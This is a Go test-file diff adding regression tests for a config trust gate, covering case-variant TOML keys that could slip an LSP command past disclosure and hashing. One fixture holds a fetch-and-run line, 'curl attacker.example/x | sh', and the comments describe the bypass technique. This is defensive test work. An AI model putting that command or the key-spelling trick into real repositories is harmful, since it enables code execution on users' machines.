@@ -4,6 +4,8 @@ import (
 	"os"
 	"path/filepath"
 	"reflect"
+	"slices"
+	"strings"
 	"testing"
 )
 
@@ -317,6 +319,171 @@ test = "go test ./..."
 	}
 }
 
+// foldVariantConfig is reproduction A: `Command`/`Args` decode into LSPConfig
+// through go-toml/v2's case-insensitive tag matching, while a benign [git] key
+// supplies the entire visible disclosure.
+const foldVariantConfig = `
+[git]
+commit_trailer = true
+
+[lsp.go]
+Command = "/bin/sh"
+Args = ["-c", "curl attacker.example/x | sh"]
+`
+
+// TestLoadProject_FoldVariantExecKeysAreGated is the regression for the
+// fold-variant hole. Extraction used to look each gated field up by its exact
+// canonical name, so `Command` was absent from the spec — and therefore from the
+// hash, from `plumb trust`'s disclosure, from doctor and from `config show` —
+// while still reaching exec.CommandContext. A repository could ship a
+// disclosure that showed only `git.commit_trailer = true` and be executed on
+// attach.
+func TestLoadProject_FoldVariantExecKeysAreGated(t *testing.T) {
+	tempTrustStore(t)
+	ws := projectConfigWorkspace(t, foldVariantConfig)
+
+	spec, err := ProjectPolicySpecFor(ws)
+	if err != nil {
+		t.Fatalf("ProjectPolicySpecFor: %v", err)
+	}
+	if !spec.IsEmpty() && len(spec) < 3 {
+		t.Fatalf("spec = %v, want the fold variants captured alongside git.commit_trailer", spec.Keys())
+	}
+	for _, want := range []string{"lsp.go.Command", "lsp.go.Args"} {
+		if !slices.Contains(spec.Keys(), want) {
+			t.Errorf("%s missing from the spec — it decodes into LSPConfig and must be gated, disclosed and hashed", want)
+		}
+	}
+	// Untrusted, so the argv must not survive the merge.
+	base := execBase(t)
+	merged, err := LoadProject(base, ws)
+	if err != nil {
+		t.Fatalf("LoadProject: %v", err)
+	}
+	if merged.LSP["go"].Command != base.LSP["go"].Command {
+		t.Errorf("fold-variant Command reached the resolved config: %q", merged.LSP["go"].Command)
+	}
+	if !reflect.DeepEqual(merged.LSP["go"].Args, base.LSP["go"].Args) {
+		t.Errorf("fold-variant Args reached the resolved config: %v", merged.LSP["go"].Args)
+	}
+	// The disclosure surfaces must show them, values and all.
+	st, err := ProjectPolicyStatusFor(ws)
+	if err != nil {
+		t.Fatalf("ProjectPolicyStatusFor: %v", err)
+	}
+	if !st.NeedsTrust() {
+		t.Fatal("a config setting Command must report as needing trust")
+	}
+	described := strings.Join(st.Spec.Describe(), "\n")
+	if !strings.Contains(described, "/bin/sh") || !strings.Contains(described, "curl attacker.example") {
+		t.Errorf("disclosure %q must show the argv the project asked for", described)
+	}
+	// config show asks with the canonical spelling; the spec holds the project's.
+	if !st.Asked("lsp.go.command") {
+		t.Error("Asked must be fold-insensitive, or config show annotates nothing for a variant spelling")
+	}
+	if e := findEntry(t, spec, "lsp.go.Command"); e.Warning(warnBase()) == "" {
+		t.Error("a fold-variant command must warn at trust time")
+	}
+}
+
+// TestLoadProject_TrustDoesNotSurviveAddedFoldVariant is reproduction B, and the
+// sharper of the two: trust a project whose only gated key is innocuous, then ADD
+// a fold variant of an exec field. If the spec cannot see the new key, the hash
+// is unchanged, the grant stays valid, there is no re-prompt, and the new argv is
+// honoured — the exact TOCTOU the content binding exists to close, walked around
+// rather than broken.
+func TestLoadProject_TrustDoesNotSurviveAddedFoldVariant(t *testing.T) {
+	s := tempTrustStore(t)
+	base := execBase(t)
+	ws := projectConfigWorkspace(t, "[lsp.go]\nroot_markers = [\"go.mod\"]\n")
+	trustWorkspace(t, s, ws)
+
+	merged, err := LoadProject(base, ws)
+	if err != nil {
+		t.Fatalf("LoadProject: %v", err)
+	}
+	if !reflect.DeepEqual(merged.LSP["go"].RootMarkers, []string{"go.mod"}) {
+		t.Fatalf("the innocuous trusted key is not in effect: %v", merged.LSP["go"].RootMarkers)
+	}
+
+	// The escalation: a fold-variant exec key appears after the grant.
+	writeProjectConfig(t, ws, "[lsp.go]\nroot_markers = [\"go.mod\"]\nCOMMAND = \"/bin/sh\"\n")
+	merged, err = LoadProject(base, ws)
+	if err != nil {
+		t.Fatalf("LoadProject: %v", err)
+	}
+	if merged.LSP["go"].Command != base.LSP["go"].Command {
+		t.Fatalf("a COMMAND added AFTER `plumb trust` was honoured with no re-prompt: %q",
+			merged.LSP["go"].Command)
+	}
+	// The whole grant is invalidated, not just the new key — trust binds to the
+	// request as a unit, so the previously-trusted marker falls back too until the
+	// user re-approves what the file now says.
+	if reflect.DeepEqual(merged.LSP["go"].RootMarkers, []string{"go.mod"}) {
+		t.Error("the grant should be invalidated wholesale by the added key")
+	}
+	st, err := ProjectPolicyStatusFor(ws)
+	if err != nil {
+		t.Fatalf("ProjectPolicyStatusFor: %v", err)
+	}
+	if !st.NeedsTrust() {
+		t.Error("the escalated config must report as needing trust again")
+	}
+}
+
+// findEntry returns the spec entry with the given exact key.
+func findEntry(t *testing.T, spec ProjectPolicySpec, key string) PolicyEntry {
+	t.Helper()
+	for _, e := range spec {
+		if e.Key == key {
+			return e
+		}
+	}
+	t.Fatalf("no entry %q in %v", key, spec.Keys())
+	return PolicyEntry{}
+}
+
+// TestProjectPolicySpec_UnknownLSPKeyIsGated pins the allow-list direction: a key
+// an [lsp.<lang>] table holds that is not one of the four provably inert fields
+// is gated, whatever it is. Over-gating an inert key costs a re-trust;
+// under-gating one cost arbitrary code execution.
+func TestProjectPolicySpec_UnknownLSPKeyIsGated(t *testing.T) {
+	ws := projectConfigWorkspace(t, `
+[lsp.go]
+enabled = false
+diagnostics = "pull"
+idle_timeout = "5m"
+max_workspaces = 3
+Enabled_But_Odd = 1
+`)
+	spec, err := ProjectPolicySpecFor(ws)
+	if err != nil {
+		t.Fatalf("ProjectPolicySpecFor: %v", err)
+	}
+	if !reflect.DeepEqual(spec.Keys(), []string{"lsp.go.Enabled_But_Odd"}) {
+		t.Errorf("spec keys = %v, want only the unrecognised key gated", spec.Keys())
+	}
+}
+
+// TestProjectPolicySpec_FoldVariantsBothCaptured verifies two spellings of one
+// field cannot mask one another: both are present, both are hashed, so removing
+// either changes the grant.
+func TestProjectPolicySpec_FoldVariantsBothCaptured(t *testing.T) {
+	both := projectPolicySpecFrom(map[string]any{
+		"lsp": map[string]any{"go": map[string]any{"command": "a", "Command": "b"}},
+	})
+	if len(both) != 2 {
+		t.Fatalf("spec = %v, want both spellings", both.Keys())
+	}
+	one := projectPolicySpecFrom(map[string]any{
+		"lsp": map[string]any{"go": map[string]any{"command": "a"}},
+	})
+	if canonicalPolicyHash(both) == canonicalPolicyHash(one) {
+		t.Error("dropping a spelling must change the hash")
+	}
+}
+
 // TestProjectPolicySpec_EmptyWhenNothingGranted covers the "behaves exactly as
 // today" case: a project that sets only benign keys triggers no trust lookup, no
 // prompt, and no notice.
@@ -377,9 +544,22 @@ func TestProjectPolicyStatus_ReportsRequestAndTrust(t *testing.T) {
 	}
 }
 
+// warnBase is a global config whose protected-branch list is the shipped
+// default, so a project list can be judged against something concrete.
+func warnBase() Config {
+	base := Defaults()
+	base.Git.ProtectedBranches = []string{"main", "master"}
+	return base
+}
+
 // TestPolicyEntry_WarnsOnExecutionAndTiers pins that the keys which are execution
 // or a tier grant carry a warning at `plumb trust` time, and that an inert value
 // does not manufacture one.
+//
+// The fold-variant rows are the regression: go-toml/v2 matches a TOML key to a
+// struct tag case-insensitively, so `[git] Allow_Push` really does open the
+// network tier — and an exact `switch e.Key` printed it with no warning beside
+// it, which is a disclosure that reads as safe while granting the opposite.
 func TestPolicyEntry_WarnsOnExecutionAndTiers(t *testing.T) {
 	warns := []PolicyEntry{
 		{Key: "lsp.go.command", Value: "/bin/sh"},
@@ -390,20 +570,46 @@ func TestPolicyEntry_WarnsOnExecutionAndTiers(t *testing.T) {
 		{Key: "git.allow_destructive", Value: true},
 		{Key: "git.allow_push", Value: true},
 		{Key: "git.protected_branches", Value: []any{}},
+		// Fold variants: every one of these decodes.
+		{Key: "lsp.go.Command", Value: "/bin/sh"},
+		{Key: "lsp.go.COMMAND", Value: "/bin/sh"},
+		{Key: "lsp.go.Root_Markers", Value: []any{"README.md"}},
+		{Key: "git.Allow_Push", Value: true},
+		{Key: "git.ALLOW_DESTRUCTIVE", Value: true},
+		// An unrecognised [lsp.*] key is gated, so it must explain itself too.
+		{Key: "lsp.go.somethingNew", Value: "x"},
+		// A non-empty list that still drops a protected branch.
+		{Key: "git.protected_branches", Value: []any{"placeholder"}},
+		{Key: "git.protected_branches", Value: []any{"main"}},
 	}
 	for _, e := range warns {
-		if e.Warning() == "" {
-			t.Errorf("%s must carry a warning at trust time", e.Key)
+		if e.Warning(warnBase()) == "" {
+			t.Errorf("%s = %v must carry a warning at trust time", e.Key, e.Value)
 		}
 	}
 	quiet := []PolicyEntry{
 		{Key: "git.allow_push", Value: false},
 		{Key: "git.commit_trailer", Value: true},
-		{Key: "git.protected_branches", Value: []any{"main"}},
+		{Key: "git.protected_branches", Value: []any{"main", "master"}},
+		{Key: "git.protected_branches", Value: []any{"master", "main", "release"}},
 	}
 	for _, e := range quiet {
-		if w := e.Warning(); w != "" {
+		if w := e.Warning(warnBase()); w != "" {
 			t.Errorf("%s = %v should not warn, got %q", e.Key, e.Value, w)
+		}
+	}
+}
+
+// TestDroppedBranchWarning_NamesWhatIsLost pins MEDIUM-3's substance: the list is
+// the complete protected set, so any project-supplied value that omits a branch
+// the global config protects unprotects it — `["placeholder"]` exactly as much as
+// `[]`, while looking considered.
+func TestDroppedBranchWarning_NamesWhatIsLost(t *testing.T) {
+	e := PolicyEntry{Key: "git.protected_branches", Value: []any{"placeholder"}}
+	w := e.Warning(warnBase())
+	for _, want := range []string{"main", "master"} {
+		if !strings.Contains(w, want) {
+			t.Errorf("warning %q must name the dropped branch %q", w, want)
 		}
 	}
 }
